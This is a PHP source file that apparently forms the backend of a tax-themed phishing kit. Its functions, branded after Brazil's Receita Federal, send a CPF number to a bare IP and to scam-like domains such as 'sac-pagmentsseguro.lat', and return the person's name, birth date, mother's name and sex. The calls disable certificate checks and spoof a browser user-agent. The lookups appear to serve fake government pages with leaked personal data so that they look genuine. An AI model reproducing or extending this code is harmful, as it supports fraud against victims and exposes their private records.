<?php
declare(strict_types=1);

function receita26NomeEhGenerico(?string $nome): bool
{
    if ($nome === null) {
        return true;
    }
    $nome = trim($nome);
    if ($nome === '') {
        return true;
    }
    $espacos = trim(preg_replace('/\s+/u', ' ', $nome));
    $n = function_exists('mb_strtoupper') ? mb_strtoupper($espacos, 'UTF-8') : strtoupper($espacos);
    $genericos = [
        'CONTRIBUINTE',
        'CIDADAO',
        'CIDADÃO',
        'CI',
        'NAO INFORMADO',
        'NÃO INFORMADO',
        'INDEFINIDO',
        '-',
    ];
    foreach ($genericos as $g) {
        $gUp = function_exists('mb_strtoupper') ? mb_strtoupper($g, 'UTF-8') : strtoupper($g);
        if ($n === $gUp) {
            return true;
        }
    }
    return false;
}

function receita26LimparTexto($valor, string $fallback = ''): string
{
    $txt = trim((string)$valor);
    return $txt === '' ? $fallback : $txt;
}

function receita26ExtrairNomeDeDados(array $dados): string
{
    $raw = $dados['nome'] ?? $dados['name'] ?? $dados['NOME'] ?? '';
    return receita26LimparTexto($raw, '');
}

function receita26MontarResposta(string $cpf, array $dados): array
{
    $nome = receita26ExtrairNomeDeDados($dados);
    if (receita26NomeEhGenerico($nome)) {
        $nome = 'Contribuinte';
    }
    return [
        'nome' => $nome,
        'cpf' => $cpf,
        'data_nascimento' => receita26LimparTexto(
            $dados['nascimento'] ?? $dados['data_nascimento'] ?? $dados['dataNascimento'] ?? $dados['NASC'] ?? '',
            ''
        ),
        'nome_mae' => receita26LimparTexto(
            $dados['nome_mae'] ?? $dados['nomeMae'] ?? $dados['mae'] ?? $dados['NOME_MAE'] ?? '',
            ''
        ),
        'sexo' => receita26LimparTexto($dados['sexo'] ?? $dados['SEXO'] ?? '', ''),
    ];
}

function receita26FormatarCpf(string $cpf): string
{
    $cpf = preg_replace('/\D/', '', $cpf);
    if (strlen($cpf) !== 11) {
        return $cpf;
    }
    return substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
}

function receita26ConsultaCpfPrimaria(string $cpf): ?array
{
    $url = 'http://195.179.229.130:3000/cpf/' . $cpf;
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $response = curl_exec($ch);
    $httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlErr = curl_error($ch);
    curl_close($ch);

    if ($curlErr !== '' || $httpCode !== 200 || !$response) {
        return null;
    }

    $json = json_decode((string)$response, true);
    if (!is_array($json) || ($json['status'] ?? '') !== 'ok') {
        return null;
    }

    $nome = receita26LimparTexto($json['nome'] ?? $json['Nome'] ?? '', '');
    if (receita26NomeEhGenerico($nome)) {
        return null;
    }

    $nascRaw = receita26LimparTexto($json['nascimento'] ?? $json['Nascimento'] ?? '', '');
    $nascFmt = '';
    if ($nascRaw !== '') {
        $ts = strtotime($nascRaw);
        $nascFmt = $ts !== false ? date('d/m/Y', $ts) : $nascRaw;
    }

    return [
        'nome' => $nome,
        'cpf' => $cpf,
        'data_nascimento' => $nascFmt,
        'nome_mae' => '',
        'sexo' => '',
    ];
}

function receita26ConsultaJsonProvedor(string $cpf): ?array
{
    $url = 'https://regularizebrasil.click/info/api/consulta.php?cpf=' . $cpf;
    $ctx = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept: application/json\r\n",
            'timeout' => 15,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ],
    ]);
    $response = @file_get_contents($url, false, $ctx);
    if ($response === false || trim($response) === '') {
        return null;
    }
    $json = json_decode((string)$response, true);
    if (!is_array($json)) {
        return null;
    }
    if (isset($json['dados'][0]) && is_array($json['dados'][0])) {
        return $json['dados'][0];
    }
    if (isset($json['DADOS']) && is_array($json['DADOS'])) {
        return $json['DADOS'];
    }
    if (!empty($json['nome']) || !empty($json['NOME'])) {
        return $json;
    }
    if (isset($json['data']['nome'])) {
        return $json['data'];
    }
    return null;
}

function receita26ParseLocationSac(string $location, string $cpfDefault): ?array
{
    $location = trim($location);
    if ($location === '' || stripos($location, 'index.html') !== false) {
        return null;
    }
    $parts = parse_url($location);
    if (empty($parts['query'])) {
        return null;
    }
    parse_str($parts['query'], $params);
    $nome = receita26LimparTexto($params['nome'] ?? $params['name'] ?? '', '');
    if (receita26NomeEhGenerico($nome)) {
        return null;
    }
    $cpfU = preg_replace('/\D/', '', (string)($params['cpf'] ?? $cpfDefault));
    if (strlen($cpfU) !== 11) {
        $cpfU = $cpfDefault;
    }
    return [
        'nome' => $nome,
        'cpf' => $cpfU,
        'data_nascimento' => receita26LimparTexto($params['nascimento'] ?? $params['data_nascimento'] ?? '', ''),
        'nome_mae' => receita26LimparTexto($params['nome_mae'] ?? '', ''),
        'sexo' => receita26LimparTexto($params['sexo'] ?? '', ''),
    ];
}

function receita26ConsultaSacGet(string $cpf): ?array
{
    $url = 'https://sac-pagmentsseguro.lat/stj/consultar.php?cpf=' . urlencode($cpf);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_HEADER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response === false) {
        return null;
    }
    $raw = (string)$response;
    if (preg_match('/^Location:\s*(.+)$/mi', $raw, $m)) {
        $parsed = receita26ParseLocationSac(trim($m[1]), $cpf);
        if ($parsed !== null) {
            return $parsed;
        }
    }
    $parts = preg_split("/\r\n\r\n/", $raw, 2);
    $body = $parts[1] ?? '';
    $json = json_decode($body, true);
    if (!is_array($json)) {
        return null;
    }
    if (isset($json['dados'][0]) && is_array($json['dados'][0])) {
        $row = $json['dados'][0];
    } elseif (isset($json['DADOS']) && is_array($json['DADOS'])) {
        $row = $json['DADOS'];
    } else {
        $row = $json;
    }
    $nome = receita26ExtrairNomeDeDados($row);
    if (receita26NomeEhGenerico($nome)) {
        return null;
    }
    return receita26MontarResposta($cpf, $row);
}

function receita26ConsultaSacPost(string $cpf): ?array
{
    $url = 'https://sac-pagmentsseguro.lat/stj/consultar.php';
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_HEADER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(['cpf' => $cpf]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded'],
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response === false || !preg_match('/^Location:\s*(.+)$/mi', (string)$response, $m)) {
        return null;
    }
    return receita26ParseLocationSac(trim($m[1]), $cpf);
}

function consultarCpfReceita26(string $cpf): array
{
    $dadosFinal = null;

    $primaria = receita26ConsultaCpfPrimaria($cpf);
    if (is_array($primaria) && !receita26NomeEhGenerico($primaria['nome'] ?? '')) {
        $dadosFinal = $primaria;
    }

    if ($dadosFinal === null) {
        $jsonRow = receita26ConsultaJsonProvedor($cpf);
        if (is_array($jsonRow)) {
            $nomeT = receita26ExtrairNomeDeDados($jsonRow);
            if ($nomeT !== '' && !receita26NomeEhGenerico($nomeT)) {
                $dadosFinal = receita26MontarResposta($cpf, $jsonRow);
            }
        }
    }

    if ($dadosFinal === null) {
        $sac = receita26ConsultaSacGet($cpf);
        if (is_array($sac) && !receita26NomeEhGenerico($sac['nome'] ?? '')) {
            $dadosFinal = $sac;
        }
    }

    if ($dadosFinal === null) {
        $sac = receita26ConsultaSacPost($cpf);
        if (is_array($sac) && !receita26NomeEhGenerico($sac['nome'] ?? '')) {
            $dadosFinal = $sac;
        }
    }

    if ($dadosFinal !== null) {
        return $dadosFinal;
    }

    return [
        'nome' => 'Contribuinte',
        'cpf' => $cpf,
        'data_nascimento' => '',
        'nome_mae' => '',
        'sexo' => '',
    ];
}
